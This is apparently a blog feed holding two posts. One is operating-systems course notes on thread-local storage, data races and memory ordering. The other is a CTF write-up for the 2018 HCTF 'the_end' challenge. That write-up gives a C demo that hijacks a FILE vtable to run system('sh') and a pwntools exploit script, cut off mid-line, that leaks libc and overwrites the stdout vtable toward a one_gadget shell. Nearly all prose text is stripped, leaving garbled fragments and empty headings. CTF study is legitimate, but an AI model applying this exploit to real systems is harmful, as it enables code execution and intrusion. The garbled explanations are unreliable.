class="string">&lt;asm/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> fs_value;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> fs_value2;</span><br><span class="line">    <span class="type">pthread_t</span> pid = pthread_self();</span><br><span class="line">    <span class="type">int</span> ret = arch_prctl(ARCH_GET_FS,&amp;fs_value2); </span><br><span class="line">    __asm__ <span class="title function_">volatile</span><span class="params">(<span class="string">&quot;mov %%fs:0, %0&quot;</span> : <span class="string">&quot;=r&quot;</span> (fs_value))</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;FS: 0x%lx\narch_prctl:0x%lx\npid:0x%lx&quot;</span>, fs_value,fs_value2,pid);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">grxer@grxer ~/D/s/N/ctest&gt; ./test</span><br><span class="line">FS: <span class="number">0x7ffff7fa6740</span></span><br><span class="line">arch_prctl:<span class="number">0x7ffff7fa6740</span></span><br><span class="line">pid:<span class="number">0x7ffff7fa6740</span>   </span><br></pre></td></tr></table></figure><p>&gt;&gt;&gt;gdb<code>fsbase</code><code>p/x pthread_self()</code></p><p><img src="/2023/04/05/NJUOS-%E5%A4%9A%E5%A4%84%E7%90%86%E5%99%A8%E7%BC%96%E7%A8%8B/image-20230404205339561.png" alt="image-20230404205339561"></p><p>gdbc</p><p>POSIXpthread_createtidpfs</p><p>__thread</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__thread <span class="type">char</span> *base, *cur; <span class="comment">// thread-local variables</span></span><br><span class="line">__thread <span class="type">int</span> id;</span><br><span class="line"></span><br><span class="line">base:.text:<span class="number">0000000000001435</span> <span class="number">64</span> <span class="number">89</span> <span class="number">04</span> <span class="number">25</span> F8 FF FF FF       mov     fs:<span class="number">0F</span>FFFFFFFFFFFFFF8h(<span class="number">-8</span>), eax</span><br><span class="line">cur.text:<span class="number">000000000000138</span>C <span class="number">64</span> <span class="number">48</span> <span class="number">8B</span> <span class="number">04</span> <span class="number">25</span> F0 FF FF FF    mov     rax, fs:<span class="number">0F</span>FFFFFFFFFFFFFF0h(<span class="number">-16</span>)</span><br><span class="line">id.text:<span class="number">0000000000001441</span> <span class="number">64</span> <span class="number">48</span> <span class="number">89</span> <span class="number">04</span> <span class="number">25</span> E8 FF FF FF    mov     fs:<span class="number">0F</span>FFFFFFFFFFFFFE8h(<span class="number">-24</span>), rax</span><br></pre></td></tr></table></figure><p>fs-8canary__exit_funcskeypthread_createmmapfs</p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;thread.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> N 100000000</span></span><br><span class="line"></span><br><span class="line"><span class="type">long</span> sum = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">Tsum</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; N; i++) &#123;</span><br><span class="line">    sum++;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  create(Tsum);</span><br><span class="line">  create(Tsum);</span><br><span class="line">  join();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;sum = %ld\n&quot;</span>, sum);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>taskset -c cpu-cpu &lt;command&gt;</code>cpu-cpu</p><p><img src="/2023/04/05/NJUOS-%E5%A4%9A%E5%A4%84%E7%90%86%E5%99%A8%E7%BC%96%E7%A8%8B/image-20230404235118554.png" alt="image-20230404235118554"></p><p></p><p><img src="/2023/04/05/NJUOS-%E5%A4%9A%E5%A4%84%E7%90%86%E5%99%A8%E7%BC%96%E7%A8%8B/image-20230404235238898.png" alt="image-20230404235238898"></p><p>sumsum</p><p>sum+++1</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:000000000000145A 48 8B 05 DF 31 00 00          mov     rax, cs:sum</span><br><span class="line">.text:0000000000001461 48 83 C0 01                   add     rax, 1</span><br><span class="line">.text:0000000000001465 48 89 05 D4 31 00 00          mov     cs:sum, rax</span><br></pre></td></tr></table></figure><p>sum++</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">asm</span> <span class="title function_">volatile</span><span class="params">(<span class="string">&quot;add $1,%0&quot;</span>:<span class="string">&quot;+m&quot;</span>(sum))</span>;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:000000000000145A 83 05 DF 31 00 00 01          add     dword ptr cs:sum, 1</span><br></pre></td></tr></table></figure><p></p><p><img src="/2023/04/05/NJUOS-%E5%A4%9A%E5%A4%84%E7%90%86%E5%99%A8%E7%BC%96%E7%A8%8B/image-20230405000115259.png" alt="image-20230405000115259"></p><p></p><p><img src="/2023/04/05/NJUOS-%E5%A4%9A%E5%A4%84%E7%90%86%E5%99%A8%E7%BC%96%E7%A8%8B/image-20230405000145046.png" alt="image-20230405000145046"></p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><ul><li>gcc-O1sum &#x3D; 100000000</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0000000000001223</span><br><span class="line">.text:0000000000001223                               ; void __cdecl Tsum()</span><br><span class="line">.text:0000000000001223                               public Tsum</span><br><span class="line">.text:0000000000001223                               Tsum proc near                          ; DATA XREF: main+5o</span><br><span class="line">.text:0000000000001223                               ; __unwind &#123;</span><br><span class="line">.text:0000000000001223 F3 0F 1E FA                   endbr64</span><br><span class="line">.text:0000000000001227 48 8B 15 12 2E 00 00          mov     rdx, cs:sum</span><br><span class="line">.text:000000000000122E 48 8D 42 01                   lea     rax, [rdx+1]</span><br><span class="line">.text:0000000000001232 48 81 C2 01 E1 F5 05          add     rdx, 5F5E101h</span><br><span class="line">.text:0000000000001232</span><br><span class="line">.text:0000000000001239</span><br><span class="line">.text:0000000000001239                               loc_1239:                               ; CODE XREF: Tsum+20j</span><br><span class="line">.text:0000000000001239 48 89 C1                      mov     rcx, rax</span><br><span class="line">.text:000000000000123C 48 83 C0 01                   add     rax, 1</span><br><span class="line">.text:0000000000001240 48 39 D0                      cmp     rax, rdx</span><br><span class="line">.text:0000000000001243 75 F4                         jnz     short loc_1239</span><br><span class="line">.text:0000000000001243</span><br><span class="line">.text:0000000000001245 48 89 0D F4 2D 00 00          mov     cs:sum, rcx</span><br><span class="line">.text:000000000000124C C3                            retn</span><br></pre></td></tr></table></figure><p>-01rcx</p><p><code>mov     cs:sum, rcx</code><code>sum = 100000000</code></p><ul><li>-O2 sum &#x3D; 200000000</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">0000000000001290</span>                               ; <span class="type">void</span> __cdecl <span class="title function_">Tsum</span><span class="params">()</span></span><br><span class="line">.text:0000000000001290                               public Tsum</span><br><span class="line">.text:0000000000001290                               Tsum proc near                          ; DATA XREF: main+<span class="number">5</span>o</span><br><span class="line">.text:<span class="number">0000000000001290</span>                               ; __unwind &#123;</span><br><span class="line">.text:<span class="number">0000000000001290</span> F3 <span class="number">0F</span> <span class="number">1</span>E FA                   endbr64</span><br><span class="line">.text:<span class="number">0000000000001294</span> <span class="number">48</span> <span class="number">81</span> <span class="number">05</span> A1 <span class="number">2</span>D <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> E1 F5+add     cs:sum, <span class="number">5F</span>5E100h</span><br><span class="line">.text:<span class="number">0000000000001294</span> <span class="number">05</span></span><br><span class="line">.text:<span class="number">000000000000129F</span> C3                            retn</span><br></pre></td></tr></table></figure><p>addaddsumsumadd1414add</p><p><img src="/2023/04/05/NJUOS-%E5%A4%9A%E5%A4%84%E7%90%86%E5%99%A8%E7%BC%96%E7%A8%8B/image-20230405004225147.png" alt="image-20230405004225147"></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="type">int</span> done;</span><br><span class="line"><span class="type">void</span> <span class="title function_">join</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (!done) &#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@grxer ~/D/s/N/p3&gt; gcc -c test.c</span><br><span class="line">grxer@grxer ~/D/s/N/p3&gt; objdump -d test.o</span><br><span class="line"></span><br><span class="line">test.o:     file format elf64-x86-64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">0000000000000000 &lt;join&gt;:</span><br><span class="line">   0:    f3 0f 1e fa          endbr64 </span><br><span class="line">   4:    55                   push   %rbp</span><br><span class="line">   5:    48 89 e5             mov    %rsp,%rbp</span><br><span class="line">   8:    90                   nop</span><br><span class="line">   9:    8b 05 00 00 00 00    mov    0x0(%rip),%eax        # f &lt;join+0xf&gt;</span><br><span class="line">   f:    85 c0                test   %eax,%eax</span><br><span class="line">  11:    74 f6                je     9 &lt;join+0x9&gt;</span><br><span class="line">  13:    90                   nop</span><br><span class="line">  14:    90                   nop</span><br><span class="line">  15:    5d                   pop    %rbp</span><br><span class="line">  16:    c3                   ret    </span><br></pre></td></tr></table></figure><p>donedone0</p><p>-O1</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@grxer ~/D/s/N/p3&gt; gcc -O1 -c test.c</span><br><span class="line">grxer@grxer ~/D/s/N/p3&gt; objdump -d test.o</span><br><span class="line"></span><br><span class="line">test.o:     file format elf64-x86<span class="number">-64</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line"><span class="number">0000000000000000</span> &lt;join&gt;:</span><br><span class="line">   <span class="number">0</span>:    f3 <span class="number">0f</span> <span class="number">1</span>e fa          endbr64 </span><br><span class="line">   <span class="number">4</span>:    <span class="number">8b</span> <span class="number">05</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    mov    <span class="number">0x0</span>(%rip),%eax        <span class="meta"># a <span class="string">&lt;join+0xa&gt;</span></span></span><br><span class="line">   a:    <span class="number">85</span> c0                test   %eax,%eax</span><br><span class="line">   c:    <span class="number">74</span> fc                je     a &lt;join+<span class="number">0xa</span>&gt;</span><br><span class="line">   e:    c3                   ret    </span><br></pre></td></tr></table></figure><p>done</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!(x=done))&#123;</span><br><span class="line">    <span class="keyword">while</span>(x)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>done</p><p>-O2</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@grxer ~/D/s/N/p3&gt; objdump -d test.o</span><br><span class="line"></span><br><span class="line">test.o:     file format elf64-x86-64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">0000000000000000 &lt;join&gt;:</span><br><span class="line">   0:    f3 0f 1e fa          endbr64 </span><br><span class="line">   4:    8b 05 00 00 00 00    mov    0x0(%rip),%eax        # a &lt;join+0xa&gt;</span><br><span class="line">   a:    85 c0                test   %eax,%eax</span><br><span class="line">   c:    75 02                jne    10 &lt;join+0x10&gt;</span><br><span class="line">   e:    eb fe                jmp    e &lt;join+0xe&gt;</span><br><span class="line">  10:    c3                   ret   </span><br></pre></td></tr></table></figure><p></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!done)&#123;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong></strong></p><p></p><ul><li><p>Memory Barrier</p><blockquote><p>asm volatile ( ::: memory)</p><p>volatile</p><p>memory  gccRAMcpuregisterscachecpu</p></blockquote></li><li><p>volatile</p><blockquote><p><strong>extern</strong> int <strong>volatile</strong> done;</p><p>volatile  done donecache</p></blockquote></li></ul><h2 id=""><a href="#" class="headerlink" title=""></a></h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;thread.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> x = <span class="number">0</span>, y = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">atomic_int</span> flag;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FLAG atomic_load(&amp;flag)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FLAG_XOR(val) atomic_fetch_xor(&amp;flag, val)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WAIT_FOR(cond) while (!(cond)) ;</span></span><br><span class="line"></span><br><span class="line"> __attribute__((noinline))</span><br><span class="line"><span class="type">void</span> <span class="title function_">write_x_read_y</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">int</span> y_val;</span><br><span class="line">  <span class="keyword">asm</span> <span class="title function_">volatile</span><span class="params">(</span></span><br><span class="line"><span class="params">    <span class="string">&quot;movl $1, %0;&quot;</span> <span class="comment">// x = 1</span></span></span><br><span class="line"><span class="params">    <span class="string">&quot;movl %2, %1;&quot;</span> <span class="comment">// y_val = y</span></span></span><br><span class="line"><span class="params">    : <span class="string">&quot;=m&quot;</span>(x), <span class="string">&quot;=r&quot;</span>(y_val) : <span class="string">&quot;m&quot;</span>(y)</span></span><br><span class="line"><span class="params">  )</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, y_val);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> __attribute__((noinline))</span><br><span class="line"><span class="type">void</span> <span class="title function_">write_y_read_x</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">int</span> x_val;</span><br><span class="line">  <span class="keyword">asm</span> <span class="title function_">volatile</span><span class="params">(</span></span><br><span class="line"><span class="params">    <span class="string">&quot;movl $1, %0;&quot;</span> <span class="comment">// y = 1</span></span></span><br><span class="line"><span class="params">    <span class="string">&quot;movl %2, %1;&quot;</span> <span class="comment">// x_val = x</span></span></span><br><span class="line"><span class="params">    : <span class="string">&quot;=m&quot;</span>(y), <span class="string">&quot;=r&quot;</span>(x_val) : <span class="string">&quot;m&quot;</span>(x)</span></span><br><span class="line"><span class="params">  )</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, x_val);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">T1</span><span class="params">(<span class="type">int</span> id)</span> &#123;</span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    WAIT_FOR((FLAG &amp; <span class="number">1</span>));</span><br><span class="line">    write_x_read_y();</span><br><span class="line">    FLAG_XOR(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">T2</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    WAIT_FOR((FLAG &amp; <span class="number">2</span>));</span><br><span class="line">    write_y_read_x();</span><br><span class="line">    FLAG_XOR(<span class="number">2</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">Tsync</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    x = y = <span class="number">0</span>;</span><br><span class="line">    __sync_synchronize(); <span class="comment">// full barrier</span></span><br><span class="line">    usleep(<span class="number">1</span>);            <span class="comment">// + delay</span></span><br><span class="line">    assert(FLAG == <span class="number">0</span>);</span><br><span class="line">    FLAG_XOR(<span class="number">3</span>);</span><br><span class="line">    <span class="comment">// T1 and T2 clear 0/1-bit, respectively</span></span><br><span class="line">    WAIT_FOR(FLAG == <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>); fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  create(T1);</span><br><span class="line">  create(T2);</span><br><span class="line">  create(Tsync);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><ul><li><p><a href="https://en.cppreference.com/w/c/atomic">https://en.cppreference.com/w/c/atomic</a></p></li><li><p><a href="https://gcc.gnu.org/onlinedocs/gcc-12.2.0/gcc/_005f_005fatomic-Builtins.html">https://gcc.gnu.org/onlinedocs/gcc-12.2.0/gcc/_005f_005fatomic-Builtins.html</a></p></li><li><p><a href="https://gcc.gnu.org/onlinedocs/gcc-4.4.7/gcc/Atomic-Builtins.html#Atomic-Builtins">https://gcc.gnu.org/onlinedocs/gcc-4.4.7/gcc/Atomic-Builtins.html#Atomic-Builtins</a></p><p>c11&lt;stdatomic.h&gt;</p><p>(atomic operation),cpu,</p></li></ul></blockquote><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Built-in Function: <span class="type">void</span> __atomic_load (type *ptr, type *ret, <span class="type">int</span> memorder)</span><br><span class="line">This is the generic version of an atomic load. It returns the contents of *ptr in *ret.</span><br></pre></td></tr></table></figure><p>flagbit</p><p>00bit1T1bit1T2</p><p>Tsync<code>FLAG_XOR(3)</code>T1T2T1T201 10 11</p><p>00</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@grxer ~/D/s/N/p3&gt; gcc -O2 -g -o mem-ordering mem-ordering.c</span><br><span class="line">grxer@grxer ~/D/s/N/p3&gt; ./mem-ordering | head -n <span class="number">10000</span> |sort| uniq -c</span><br><span class="line">   <span class="number">7970</span> <span class="number">0</span> <span class="number">0</span> </span><br><span class="line">   <span class="number">1756</span> <span class="number">0</span> <span class="number">1</span> </span><br><span class="line">    <span class="number">274</span> <span class="number">1</span> <span class="number">0</span> </span><br><span class="line"><span class="meta">#head -n n sort uniq -c</span></span><br></pre></td></tr></table></figure><p>  <a href="https://www.bilibili.com/video/BV1844y1z7Dx">https://www.bilibili.com/video/BV1844y1z7Dx</a></p><p>micro-operationsuOps</p><p></p><p></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">     # &lt;-----------+</span><br><span class="line">movl $<span class="number">1</span>, (x)   #   |</span><br><span class="line">movl (y), %eax # --+</span><br></pre></td></tr></table></figure><p>FLAG_XOR(3)CPUCPU<code>movl $1, %0;</code>cache misscpu0</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;movl $1, %0;&quot;</span> <span class="comment">// y = 1    </span></span><br><span class="line"><span class="string">&quot;movl %2, %1;&quot;</span> <span class="comment">// x_val = x</span></span><br><span class="line">: <span class="string">&quot;=m&quot;</span>(y), <span class="string">&quot;=r&quot;</span>(x_val) : <span class="string">&quot;m&quot;</span>(x)</span><br></pre></td></tr></table></figure><p><strong></strong></p><ul><li><p>Memory barrier:<a href="https://gcc.gnu.org/onlinedocs/gcc/_005f_005fsync-Builtins.html">__sync_synchronize()</a></p><blockquote><p><a href="https://zhuanlan.zhihu.com/p/41872203"></a></p><p>Built-in Function: <em>void</em> <strong>__sync_synchronize</strong> <em>()</em></p><p>This built-in function issues a full memory barrier.</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> __sync_synchronize (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* This issues the &quot;mfence&quot; instruction on x86/x86_64.  */</span></span><br><span class="line">  __asm__ __volatile__ (<span class="string">&quot;mfence&quot;</span> : : : <span class="string">&quot;memory&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>asm volatile ( ::: memory)</p><p>CPUCPU memory fenceX86memory fencemfence</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;movl $1, %0;&quot;</span> <span class="comment">// x = 1</span></span><br><span class="line"><span class="string">&quot;mfence;&quot;</span></span><br><span class="line"><span class="string">&quot;movl %2, %1;&quot;</span> <span class="comment">// y_val = y</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@grxer ~/D/s/N/p3&gt; ./mem-ordering | head -n <span class="number">10000</span> |sort| uniq -c</span><br><span class="line">   <span class="number">1462</span> <span class="number">0</span> <span class="number">1</span> </span><br><span class="line">    <span class="number">221</span> <span class="number">1</span> <span class="number">0</span> </span><br><span class="line">   <span class="number">8317</span> <span class="number">1</span> <span class="number">1</span> </span><br></pre></td></tr></table></figure></blockquote></li><li><p> </p><p>flag</p><p><code>stdatomic.h</code></p></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> NJUOS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vtable Hijack--2018 HCTF the_end</title>
      <link href="/2023/04/03/vtable-hijack/"/>
      <url>/2023/04/03/vtable-hijack/</url>
      
        <content type="html"><![CDATA[<p>IO_IO_FILE_plus vtable</p><h2 id="glibc2-23"><a href="#glibc2-23" class="headerlink" title="glibc2.23"></a>glibc2.23</h2><p>vtable</p><p><img src="/2023/04/03/vtable-hijack/image-20230402114035931.png" alt="image-20230402114035931"></p><p>2.23libc_IO_file_jumps</p><p>_IO_FILE_plus vtablealloc</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> system_ptr 0x7ffff7a523a0;</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    FILE *fp;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> *vtable_addr,*fake_vtable;</span><br><span class="line"></span><br><span class="line">    fp=fopen(<span class="string">&quot;flag&quot;</span>,<span class="string">&quot;rw&quot;</span>);</span><br><span class="line">    fake_vtable=<span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line"></span><br><span class="line">    vtable_addr=(<span class="type">long</span> <span class="type">long</span> *)((<span class="type">long</span> <span class="type">long</span>)fp+<span class="number">0xd8</span>); <span class="comment">//vtable offset</span></span><br><span class="line"></span><br><span class="line">    vtable_addr[<span class="number">0</span>]=(<span class="type">long</span> <span class="type">long</span>)fake_vtable;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(fp,<span class="string">&quot;sh&quot;</span>,<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">    fake_vtable[<span class="number">7</span>]=system_ptr; <span class="comment">//xsputn</span></span><br><span class="line"></span><br><span class="line">    fwrite(<span class="string">&quot;hi&quot;</span>,<span class="number">2</span>,<span class="number">1</span>,fp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>fwritevtable**__xsputn<strong></strong>libio&#x2F;fileops.c_IO_new_file_xsputn**_IO_FILE,</p><p><img src="/2023/04/03/vtable-hijack/image-20230402114847219.png" alt="image-20230402114847219"></p><p><img src="/2023/04/03/vtable-hijack/image-20230402115216810.png" alt="image-20230402115216810"></p><h2 id="2018-HCTF-the-end"><a href="#2018-HCTF-the-end" class="headerlink" title="2018 HCTF the_end"></a>2018 HCTF the_end</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@grxer /m/h/S/c/p/io_file&gt; checksec the_end </span><br><span class="line">[*] <span class="string">&#x27;/mnt/hgfs/Share/ctfwiki/pwn/io_file/the_end&#x27;</span></span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>libc</p><h3 id="hijack-IO-2-1-stdout-vtable-setbuf"><a href="#hijack-IO-2-1-stdout-vtable-setbuf" class="headerlink" title="hijack IO_2_1_stdout vtable _setbuf"></a>hijack <em>IO_2_1_stdout</em> vtable _setbuf</h3><p>exitexitsc <code>exit</code>  <code>_IO_list_all</code> stderr stdout stdin</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">for</span> (fp = (_IO_FILE *) _IO_list_all; fp; fp = fp-&gt;_chain)</span><br><span class="line">   &#123;</span><br><span class="line">     <span class="keyword">if</span> (! (fp-&gt;_flags &amp; _IO_UNBUFFERED)</span><br><span class="line">  <span class="comment">/* Iff stream is un-orientated, it wasn&#x27;t used. */</span></span><br><span class="line">  &amp;&amp; fp-&gt;_mode != <span class="number">0</span>)</span><br><span class="line">&#123;</span><br></pre></td></tr></table></figure><p>if<code>vtable</code>  <code>_setbuf</code> _IO_UNBUFFERED2</p><p><img src="/2023/04/03/vtable-hijack/image-20230403113124697.png" alt="image-20230403113124697"></p><p>stdout</p><p>stdoutvtablevtablevtable+0x58libc</p><p><img src="/2023/04/03/vtable-hijack/image-20230403121636295.png" alt="image-20230403121636295"></p><p>0x7ffff7dd1968-0x58vtablestdin+0x30</p><p>vtable+0x58onegadget</p><p><img src="/2023/04/03/vtable-hijack/image-20230403125159852.png" alt="image-20230403125159852"></p><p>cat flag &gt; &amp;0exec 1&gt;&amp;0</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"><span class="title function_">context</span><span class="params">(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span></span><br><span class="line">pwnfile=<span class="string">&#x27;./the_end&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="string">&#x27;25172&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = lambda x: io.recv(x)</span><br><span class="line">ra = lambda: io.recvall()</span><br><span class="line">rl = lambda: io.recvline(keepends=True)</span><br><span class="line">ru = lambda x: io.recvuntil(x, drop=True)</span><br><span class="line">s = lambda x: io.send(x)</span><br><span class="line">sl = lambda x: io.sendline(x)</span><br><span class="line">sa = lambda x, y: io.sendafter(x, y)</span><br><span class="line">sla = lambda x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = lambda: io.interactive()</span><br><span class="line">c = lambda: io.close()</span><br><span class="line">li = lambda x: <span class="built_in">log</span>.info(x)</span><br><span class="line">db = lambda x : gdb.attach(io,x)</span><br><span class="line">dbio= lambda : gdb.attach(io)</span><br><span class="line">uu32 = lambda x   : u32(x.ljust(<span class="number">4</span>,b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>))</span><br><span class="line">uu64 = lambda x   : u64(x.ljust(<span class="number">8</span>,b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>))</span><br><span class="line">p =lambda x,y:print(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + hex(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line">ru(b<span class="number">&#x27;</span>a gift <span class="string">&#x27;)</span></span><br><span class="line"><span class="string">sleep_ad=int(ru(b&#x27;</span>,<span class="string">&#x27;),16)</span></span><br><span class="line"><span class="string">p(&#x27;</span>sleep<span class="number">&#x27;</span>,sleep_ad)</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;sleep&#x27;</span>,sleep_ad)</span><br><span class="line">base=sleep_ad-libc.dump(<span class="string">&#x27;sleep&#x27;</span>)</span><br><span class="line">p(<span class="string">&#x27;base&#x27;</span>,base)</span><br><span class="line">onegadget=base+<span class="number">0xf02b0</span></span><br><span class="line"><span class="built_in">stdin</span>=libc.dump(<span class="string">&#x27;_IO_2_1_stdin_&#x27;</span>)+base</span><br><span class="line"><span class="built_in">stdout</span>=libc.dump(<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>)+base</span><br><span class="line"><span class="meta"># gdb.attach(io)</span></span><br><span class="line"><span class="meta"># db(<span class="string">&#x27;b exit&#x27;</span>)</span></span><br><span class="line">ru(b<span class="number">&#x27;</span>\n<span class="number">&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i in range(<span class="number">2</span>):</span><br><span class="line">    s(p64(<span class="built_in">stdout</span>+<span class="number">0xd8</span>+i))</span><br><span class="line">    s(p8(p64(<span class="built_in">stdin</span>+<span class="number">0x30</span>)[i]))</span><br><span class="line"><span class="meta"># dbio</span></span><br><span class="line"><span class="meta"># gdb.attach(io)</span></span><br><span class="line"><span class="keyword">for</span> i in range(<span class="number">3</span>):</span><br><span class="line">    s(p64(<span class="built_in">stdin</span>+<span class="number">0x30</span>+<span 